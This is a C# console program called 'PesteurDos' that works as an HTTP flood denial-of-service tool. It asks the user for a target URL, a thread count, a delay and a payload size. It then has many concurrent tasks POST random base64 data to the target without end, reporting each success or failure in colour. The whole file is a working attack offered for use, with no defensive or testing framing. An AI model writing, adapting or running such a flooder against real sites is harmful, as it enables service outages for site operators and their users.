using System;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PesteurDos
{
    class Program
    {
        static async Task Main(string[] args)
        {

            string asciiArt = @"
██████  ███████ ███████ ████████ ███████ ██    ██ ██████  
██   ██ ██      ██         ██    ██      ██    ██ ██   ██ 
██████  █████   ███████    ██    █████   ██    ██ ██████  
██      ██           ██    ██    ██      ██    ██ ██   ██ 
██      ███████ ███████    ██    ███████  ██████  ██   ██ 

";
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(asciiArt);
            Console.ResetColor();


            Console.Write("Enter the target URL: ");
            string url = Console.ReadLine();


            if (!Uri.IsWellFormedUriString(url, UriKind.Absolute))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[Error] Invalid URL format. Please make sure the URL starts with http:// or https://.");
                Console.ResetColor();
                return;
            }


            Console.Write("Enter the number of threads: ");
            int numThreads = int.Parse(Console.ReadLine());


            Console.Write("Enter the delay between requests (in milliseconds): ");
            int delay = int.Parse(Console.ReadLine());


            Console.Write("Enter the payload size (in bytes): ");
            int payloadSize = int.Parse(Console.ReadLine());


            Console.WriteLine("[+] Sending POST requests with the following settings:");
            Console.WriteLine($"    Target URL: {url}");
            Console.WriteLine($"    Number of Threads: {numThreads}");
            Console.WriteLine($"    Delay between Requests: {delay} ms");
            Console.WriteLine($"    Payload Size: {payloadSize} bytes");


            await StartThreads(url, numThreads, delay, payloadSize);
        }

        static async Task StartThreads(string url, int numThreads, int delay, int payloadSize)
        {

            byte[] payload = new byte[payloadSize];
            new Random().NextBytes(payload);
            var content = new StringContent(Convert.ToBase64String(payload), Encoding.UTF8, "application/x-www-form-urlencoded");


            using (var client = new HttpClient())
            {

                Task[] tasks = new Task[numThreads];
                for (int i = 0; i < numThreads; i++)
                {
                    int threadId = i + 1;
                    tasks[i] = Task.Run(() => SendRequests(url, client, content, delay, threadId));
                }


                await Task.WhenAll(tasks);
            }
        }

        static async Task SendRequests(string url, HttpClient client, StringContent content, int delay, int threadId)
        {
            while (true)
            {
                try
                {

                    var response = await client.PostAsync(url, content);


                    if (response.IsSuccessStatusCode)
                    {
                        Console.ForegroundColor = ConsoleColor.Green;
                        Console.WriteLine($"Thread {threadId}: [POST request sent successfully]");
                    }
                    else
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"Thread {threadId}: [Failed with status code {response.StatusCode}]");
                    }
                }
                catch (Exception ex)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"Thread {threadId}: [Error: {ex.Message}]");
                }
                finally
                {

                    Console.ResetColor();
                }


                await Task.Delay(delay);
            }
        }
    }
}
